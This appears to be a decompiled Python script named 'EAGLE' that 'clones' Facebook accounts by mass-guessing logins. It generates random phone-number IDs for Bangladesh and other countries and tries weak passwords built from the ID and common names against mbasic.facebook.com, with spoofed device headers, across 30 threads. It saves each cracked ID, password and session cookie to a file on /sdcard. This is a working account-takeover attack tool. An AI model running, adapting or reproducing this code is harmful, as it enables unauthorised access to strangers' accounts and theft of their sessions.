#dec by mr decoder #
import pycurl,os, platform,string,sys,re,requests
import re
from bs4 import BeautifulSoup
from io import BytesIO
from os import path,system
import os,httpx,json,time,re,random,sys,uuid,string,subprocess,platform,datetime
import os,base64,zlib,pip,urllib
try:
        sys.stdout.write('\x1b]2; EAGLE \x07')
        os.system('pip uninstall httpx -y&& pip install httpx && pip uninstall requests -y&& pip install requests && pip uninstall pycurl -y&& pip install pycurl')
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
        from urllib.request import urlopen
        from time import localtime as lt
except ModuleNotFoundError:
        os.system('pip install requests futures==2 > /dev/null')
except:pass
#-----------------------[ COLOR-CODE ]-----------------------#
A='\x1b[38;5;119m'
B='\x1b[38;5;120m'
C='\x1b[38;5;121m'
D='\x1b[38;5;122m'
W='\033[1;37m'
G='\033[38;5;46m'
R='\033[38;5;196m'
P='\033[38;5;203m'
I='\033[38;5;56m'
Y='\033[38;5;208m'
L='\033[38;5;46m'
X='\033[38;5;65m'
G='\033[38;5;46m'
R='\033[38;5;196m'
W='\033[1;97m'
#-----------------------[ DATE-CODE ]-----------------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
date = str(tgl)+'-'+str(bln)
ltx = int(lt()[3])
#-----------------------[ APK-CHECKER ]-----------------------#
def cek_apk(coki):
    session = requests.Session()
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r\r{W}[{G}≈{W}]{G} NOT FOUND ACTIVE APK & WEBSITE')
    else:
        print(f'\r\r{W}[{G}≈{W}]{G} YOUR ACTIVE APK & WEBSITE')
        for i in range(len(game)):
            print(f"\r\r{W}[{G}{i+1}{W}]{G} %s"%(game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r\r{W}[{G}≈{W}]{R} NOT FOUND EXPIRED APK & WEBSITE')
    else:
        print(f'\r\r{W}[{G}≈{W}]{R} YOUR EXPIRED APK & WEBSITE')
        for i in range(len(game)):
            print(f"\r\r{W}[{G}{i+1}{W}]{R} %s"%(game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
#-----------------------[ VERSION-SERVER ]-----------------------#
sion = httpx.get('https://raw.githubusercontent.com/BLAZE-143/app.txt/main/version.txt').text
lol = str(sion)
#-----------------------[ USER-SERVER ]-----------------------#
loop=0
ok=[]
cp=[]
user=[]
ugen=[]
#-----------------------[ LOGO ]--------------------#
logo=(f'''\033[1;97m
888888    db     dP""b8 88     888888 
88__     dPYb   dP   `" 88     88__   
88""    dP__Yb  Yb  "88 88  .o 88""   
888888 dP""""Yb  YboodP 88ood8 888888
{W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{W}[{G}={W}] DEVELOPER  {R}>{W} AHMED FARHAN
{W}[{G}={W}] FACEBOOK   {R}>{W} AHMED FARHAN
{W}[{G}={W}] GITHUB     {R}>{W} BLAZE-143
{W}[{G}={W}] STATUS     {R}>{G} FREE 
{W}[{G}={W}] VERSION    {R}> {G}{lol}{W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━''')
#-----------------------[ CLEAR-CODE ]-----------------------#
def clear():
        os.system('clear')
        print(logo)
#-----------------------[ LINE-CODE ]-----------------------#
def linex():
        print(f'{W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
#---------------------[ MAIN-DEF ]---------------------#
def Main():
    clear()
    print(f'{W}[{G}1{W}] RANDOM CLONE ')
    print(f'{W}[{G}2{W}] ADMIN SUPPORT ')
    print(f'{W}[{G}3{W}] GITHUB ACCOUNT')
    print(f'{W}[{G}0{W}] EXIT')
    linex()
    xyz = input(f'{W}[{G}={W}] CHOICE : ')
    if xyz in ['1','01']:country()
    elif xyz in ['2','02']:os.system("xdg-open https://www.facebook.com/F4RH9NXXX.COM12")
    elif xyz in ['3','03']:os.system("xdg-open https://github.com/BLAZE-143")
    else:os.system('exit')
#-------------------[ COUNTRY ]-------------------#
def country():
    clear()
    print(f'{W}[{G}1{W}] BANGLADESH RANDOM ')
    print(f'{W}[{G}2{W}] INDIA RANDOM ')
    print(f'{W}[{G}3{W}] MALAYSIA RANDOM ')
    print(f'{W}[{G}4{W}] NEPAL RANDOM ')
    print(f'{W}[{G}0{W}] EXIT ');linex()
    cun = input(f'{W}[{G}={W}] CHOICE : ')
    if cun in ['1','a','A','01']:rndm_bd()
    elif cun in ['2','b','B','02']:rndm_ind()
    elif cun in ['3','c','C','03']:rndm_m()
    elif cun in ['4','04']:rndm_nepal()
    elif cun in ['5','05']:rndm_ind()
    elif cun in ['6','06']:rndm_ind()
    else:main()
#-------------------[ RNDM BD ]-------------------#
def rndm_bd():
    clear()
    print(f'{W}[{G}1{W}] METHOD 1 ')
    print(f'{W}[{G}2{W}] METHOD 2 ')
    print(f'{W}[{G}3{W}] METHOD 3 ')
    print(f'{W}[{G}4{W}] METHOD 4 ')
    linex()
    server = input(f'{W}[{G}={W}] SELECT SERVER : ')
    clear()
    print(f'{W}[{G}={W}] EX : 1000,2000,5000')
    linex()
    limit = int(input(f'{W}[{G}={W}] PUT LIMIT : '))
    clear()
    print(f'{W}[{G}={W}] SIM CODE : 017,018,019')
    linex()
    code = input(f'{W}[{G}≈{W}] PUT CODE : ')
    for t in range(limit):
        _txt_ = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(_txt_)
        with tred(max_workers=30) as jan:
            tl = str(len(user))
            clear()
            print(f'{W}[{G}={W}] TOTAL IDS \033[38;5;196m={G} {limit} ')
            print(f'{W}[{G}={W}] NOTE      \033[38;5;196m= {G}LOCK IDS AUTO REMOVE')
            print(f'{W}[{G}={W}] USE FLIGHT MODE EVERY 5 MINUTES... ');linex()
            for love in user:
                ids = code + love
                pasx = [ids,love,ids[:7],ids[:6],love[1:],love[2:],'sadiya','nadiya','tabassum','humayra','jannat','mimmim','mimi']
                if server in ['1','01']:jan.submit(x,ids,pasx,tl)
                elif server in ['2','02']:jan.submit(mbasic,ids,pasx,tl)
                elif server in ['3','03']:jan.submit(m,ids,pasx,tl)
                else:jan.submit(p,ids,pasx,tl)
#---------[ USER-AGENT ]--------#
gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
for xd in range(10000):
        aa='Mozilla/5.0 (Linux; U; Android'
        b=random.choice(['6','7','8','9','10','11','12','13'])
        c=f' TL-tl; {str(gt)}'
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36'
        uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
        ugen.append(uaku2)
#-------------------[ RANDOM METHOD ]-------------------#
def x(ids,pasx,tl):
    global loop,ok
    sys.stdout.write(f'\r{W}[{G}={W}] {W}[{A}EAGLE-RD{W}|{C}{loop}{W}|{G}{len(ok)}{W}|{R}{len(cp)}{W}]');sys.stdout.flush()
    try:
        for pas in pasx:
            session = requests.Session()
            ua = random.choice(ugen)
            rr = random.randint
            rc = random.choice
            models = random.choice(['SM-J100F', 'SM-J100FN', 'SM-J100H', 'SM-J100H/DD', 'SM-J100H', 'SM-J100M', 'SM-J100MU', 'SM-J100ML', 'SM-J100VPP', 'SM-J100Y', 'SM-J111F', 'SM-J110G', 'SM-J110F', 'SM-J110H', 'SM-J110M', 'SM-J110L', 'SM-J111M', 'SM-M526BR', 'SM-M526BR/DS', 'SM-M526B', 'SM-M526B/DS', 'SM-A326B', 'SM-A326B/DS', 'SM-A326BR/DS', 'SM-A326BR', 'SM-A326U', 'SM-A326W', 'SM-A326U1', 'SM-A326K', 'SCG08', 'SM-S326DL', 'V2027', 'V2032', 'RMX2027', 'RMX2020', 'RMX2021', 'CPH1969', 'CPH2209', 'CPH1987'])
            session.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="114"',"sec-ch-ua-mobile": "?0","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            link = session.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=3213804762189845&kid_directed_site=0&app_id=3213804762189845&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.1%2Fdialog%2Foauth%3Fclient_id%3D3213804762189845%26redirect_uri%3Dhttps%253A%252F%252Fwww.capcut.com%252Fpassport%252Fweb%252Fweb_login_success%26scope%3Demail%26state%3D3c7611813gAToVCgoVPZIDA2ZGVlNWU4YjUwZDhmNzcwOTM4NDQ5NTY4MzNjMTE3oU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIGE2OWM5MWM2YjdiOGFmNWMyNDI4ZGRjODJlMGRkNTY0oVcAoUYAolNBAKFVwqJNTMI%25253D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D142ed561-e5c8-49a4-bec4-eaa45bae67f0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.capcut.com%2Fpassport%2Fweb%2Fweb_login_success%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D3c7611813gAToVCgoVPZIDA2ZGVlNWU4YjUwZDhmNzcwOTM4NDQ5NTY4MzNjMTE3oU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIGE2OWM5MWM2YjdiOGFmNWMyNDI4ZGRjODJlMGRkNTY0oVcAoUYAolNBAKFVwqJNTMI%25253D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
            data = {
            'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
            'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
            'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
            'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
            'try_number': re.search('name="try_number" value="(.*?)"',str(link.text)).group(1),
            'unrecognized_tries': re.search('name="unrecognized_tries" value="(.*?)"',str(link.text)).group(1),
            'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(link.text)).group(1),
            '_fb_noscript': 'true',
            'email': ids,
            'pass': pas,
            'login': 'Masuk'
            }
            head = {
            'Host': 'mbasic.facebook.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'dpr': f'{str(rr(1,5))}.{str(rr(1000,5000))}',
            'origin': 'https://p.facebook.com',
            'referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=3213804762189845&kid_directed_site=0&app_id=3213804762189845&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.1%2Fdialog%2Foauth%3Fclient_id%3D3213804762189845%26redirect_uri%3Dhttps%253A%252F%252Fwww.capcut.com%252Fpassport%252Fweb%252Fweb_login_success%26scope%3Demail%26state%3D3c7611813gAToVCgoVPZIDA2ZGVlNWU4YjUwZDhmNzcwOTM4NDQ5NTY4MzNjMTE3oU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIGE2OWM5MWM2YjdiOGFmNWMyNDI4ZGRjODJlMGRkNTY0oVcAoUYAolNBAKFVwqJNTMI%25253D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D142ed561-e5c8-49a4-bec4-eaa45bae67f0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.capcut.com%2Fpassport%2Fweb%2Fweb_login_success%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D3c7611813gAToVCgoVPZIDA2ZGVlNWU4YjUwZDhmNzcwOTM4NDQ5NTY4MzNjMTE3oU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIGE2OWM5MWM2YjdiOGFmNWMyNDI4ZGRjODJlMGRkNTY0oVcAoUYAolNBAKFVwqJNTMI%25253D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="116", "Google Chrome";v="116"',
            'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="116.0.5761.201", "Google Chrome";v="116.0.5761.201"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-model': f'"{models}"',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': f'"{str(rr(6,13))}"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': ua,
            'viewport-width': '421',
            'x-asbd-id': '129477',
            'x-fb-lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
            'x-requested-with': 'XMLHttpRequest',
            'x-response-format': 'JSONStream',
            }
            params = {
            'api_key': '3213804762189845',
            'auth_token': '86ee9081567a3ae59cfedd887a685aca',
            'skip_api_login': '1',
            'signed_next': '1',
            'next': 'https://mbasic.facebook.com/v3.1/dialog/oauth?client_id=3213804762189845&redirect_uri=https%3A%2F%2Fwww.capcut.com%2Fpassport%2Fweb%2Fweb_login_success&scope=email&state=3c7611813gAToVCgoVPZIDA2ZGVlNWU4YjUwZDhmNzcwOTM4NDQ5NTY4MzNjMTE3oU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIGE2OWM5MWM2YjdiOGFmNWMyNDI4ZGRjODJlMGRkNTY0oVcAoUYAolNBAKFVwqJNTMI%253D&ret=login&fbapp_pres=0&logger_id=142ed561-e5c8-49a4-bec4-eaa45bae67f0&tp=unspecified',
            'refsrc': 'deprecated',
            'app_id': '3213804762189845',
            'cancel': 'https://www.capcut.com/passport/web/web_login_success?error=access_denied&error_code=200&error_description=Permissions+error&error_reason=user_denied&state=3c7611813gAToVCgoVPZIDA2ZGVlNWU4YjUwZDhmNzcwOTM4NDQ5NTY4MzNjMTE3oU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIGE2OWM5MWM2YjdiOGFmNWMyNDI4ZGRjODJlMGRkNTY0oVcAoUYAolNBAKFVwqJNTMI%253D#_=_',
            'lwv': '100',
            }
            lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',params=params,headers=head,data=data,allow_redirects=False)
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                idf = re.findall('c_user=(.*);xs', coki)[0]
                print(f'\r\r{W}[{G}={W}] \033[38;5;46m[EAGLE-OK] {str(idf)} | {pas}\033[1;37m')
                open('/sdcard/EAGLE-RD-OK.txt','a').write(str(idf)+'|'+pas+'|'+coki+'\n')
                ok.append(idf)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                coki1 = coki.split("1000")[1]
                idf = "1000"+coki1[0:11]
                open('/sdcard/EAGLE-RD-CP.txt','a').write(str(idf)+'|'+pas+'\n')
                cp.append(idf)
                break
            else:
                continue
        loop+=1
    except Exception as e:
        print(f'ERROR : {e}')
        pass
Main()
